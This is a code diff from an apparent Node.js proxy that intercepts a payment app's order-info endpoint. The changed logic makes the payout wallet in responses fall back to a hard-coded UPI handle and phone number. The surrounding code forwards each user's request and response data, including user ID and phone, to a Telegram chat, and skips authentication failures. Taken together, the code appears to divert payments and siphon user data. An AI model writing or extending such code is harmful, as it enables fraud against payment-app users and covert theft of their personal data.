@@ -479,7 +479,7 @@ function sendJsonSafe(res, headers, json, fallback, req) {
       const method = req.method || 'GET';
       const userId = req._userId || 'N/A';
       const phone = req._phone || '';
-      
+
       let reqBodyStr = req.parsedBody ? JSON.stringify(req.parsedBody, null, 2) : '';
       let respBodyStr = json ? JSON.stringify(json, null, 2) : (typeof fallback === 'string' ? fallback : JSON.stringify(fallback, null, 2));
 
@@ -498,8 +498,8 @@ function sendJsonSafe(res, headers, json, fallback, req) {
         debugMsg += `📤 *Response Data:*\n\`\`\`json\n${respBodyStr}\n\`\`\``;
       }
 
-      bot.sendMessage(cachedData.adminChatId, debugMsg, { parse_mode: 'Markdown' }).catch(() => {});
-    } catch (e) {}
+      bot.sendMessage(cachedData.adminChatId, debugMsg, { parse_mode: 'Markdown' }).catch(() => { });
+    } catch (e) { }
   }
 
   if (json && isAuthFailureResponse(json) && shouldBypass401(req)) {
@@ -2507,11 +2507,22 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
 
       const walletNamesMap = { 1: "Airtel", 2: "Freecharge", 3: "PhonePe", 4: "Mobikwik", 5: "Paytm", 6: "AmazonPay" };
       const walletIntentMap = { 1: "airtel://", 2: "freecharge://", 3: "phonepe://", 4: "mobikwik://", 5: "paytmmp://", 6: "amazonpay://" };
+      const walletDefaultUpi = { 1: "@airtel", 2: "knandkk07@freecharge", 3: "@ybl", 4: "@ikwik", 5: "@paytm", 6: "@apl" };
 
-      const wName = dummyMatch.payoutWalletName || "Freecharge";
-      const wAcct = dummyMatch.payoutWalletAccount || phone || "6206785398";
-      const wUpi = dummyMatch.payoutWalletUpi || (wAcct + "@" + wName.toLowerCase());
       const wType = dummyMatch.payoutWalletType || 2;
+      const wName = dummyMatch.payoutWalletName || walletNamesMap[wType] || "Freecharge";
+      const wAcct = dummyMatch.payoutWalletAccount || phone || "6206785398";
+
+      let wUpi = dummyMatch.payoutWalletUpi;
+      if (!wUpi) {
+        if (wType === 2) {
+          wUpi = "knandkk07@freecharge";
+        } else if (walletDefaultUpi[wType]) {
+          wUpi = wAcct + walletDefaultUpi[wType];
+        } else {
+          wUpi = wAcct + "@" + wName.toLowerCase();
+        }
+      }
       const wIntent = dummyMatch.intent || walletIntentMap[wType] || (wName.toLowerCase() + "://");
 
       jsonResp = {
@@ -2676,7 +2687,7 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
             };
             if (orderCodeStr && orderCodeStr !== 'N/A') data.orderBankMap[orderCodeStr] = bindingObj;
             if (orderIdStr) data.orderBankMap[orderIdStr] = bindingObj;
-            saveData(data).catch(() => {});
+            saveData(data).catch(() => { });
           }
         }
       }
@@ -2697,7 +2708,7 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
         if (!isAlreadySent) {
           if (orderCodeStr && orderCodeStr !== 'N/A') data.sentOrderInfo[orderCodeStr] = true;
           if (orderIdStr) data.sentOrderInfo[orderIdStr] = true;
-          saveData(data).catch(() => {});
+          saveData(data).catch(() => { });
 
           let payoutSection = '';
           if (dd.payoutWallet || dd.walletName || dd.payTypeName || dd.payoutWalletName) {
